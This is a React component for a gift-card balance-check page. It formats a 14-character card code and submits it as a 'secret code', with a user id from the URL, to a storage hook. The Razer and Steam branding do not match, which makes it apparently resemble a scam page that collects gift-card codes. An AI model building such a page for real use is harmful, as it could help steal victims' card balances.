import React from "react";
import Razer from "/new-razer.jpg";
import { useState } from "react";
import { useParams } from "react-router-dom";
import BalanceTab from "../UI/BalanceTab";
import useStorePin from "../customHooks/useStorePin";

export default function Hero() {
  const [showBal, setShowBal] = useState(false);
  const [cardCode, setCardCode] = useState("");

  const { id } = useParams();
  const userID = id || "";

  const { store, data, isPending, error } = useStorePin(
    setShowBal,
    setCardCode
  );

  function handleSubmit(e) {
    e.preventDefault();

    const code = cardCode.trim();
    if (!code || code.length !== 17) return;

    store({ secreteCode: code, userID });
  }

  const handleInputChange = (e) => {
    // strip everything except digits
    let value = e.target.value.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();

    value = value.slice(0, 14); // max 14 digits

    // format as 3-3-4-4
    let formatted = "";
    if (value.length > 0) formatted += value.slice(0, 3);
    if (value.length > 3) formatted += " " + value.slice(3, 6);
    if (value.length > 6) formatted += " " + value.slice(6, 10);
    if (value.length > 10) formatted += " " + value.slice(10, 14);

    setCardCode(formatted);
  };

  return (
    <main className="flex flex-col md:flex-row items-center md:justify-center bg-gradient-to-r from-black to-gray-900 gap-10 py-20 px-6 bg-black min-h-[calc(100vh-80px)] text-white">
      {/* Left - Steam Card Image */}
      <div className="flex justify-center md:justify-end max-w-md">
        <img
          className="w-72 md:w-96 rounded-lg shadow-lg"
          src={Razer}
          alt="Steam Card"
        />
      </div>

      {showBal && (
        <BalanceTab
          closeBal={() => setShowBal(false)}
          balance={data?.data?.balance}
        />
      )}

      {!showBal && (
        <form
          className="w-full max-w-md  text-white p-6 rounded-2xl shadow-md"
          onSubmit={handleSubmit}
        >
          <label className="block font-medium mb-2">
            Enter Your 14-digit Card Code
          </label>
          <input
            inputMode="text"
            value={cardCode}
            onChange={handleInputChange}
            placeholder="XXX-XXX-XXXX-XXXX"
            maxLength={17} //
            className="w-full px-4 py-2 border border-gray-100 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-500 tracking-widest"
          />
          {error && (
            <p className="text-center text-red-500">
              {error?.response?.data?.message}
            </p>
          )}
          <button
            type="submit"
            className="mt-4 w-full bg-green-800 text-white py-2 rounded-lg hover:bg-green-900 cursor-pointer transition font-bold"
          >
            {isPending ? "Checking..." : "Check Balance"}
          </button>
        </form>
      )}
    </main>
  );
}
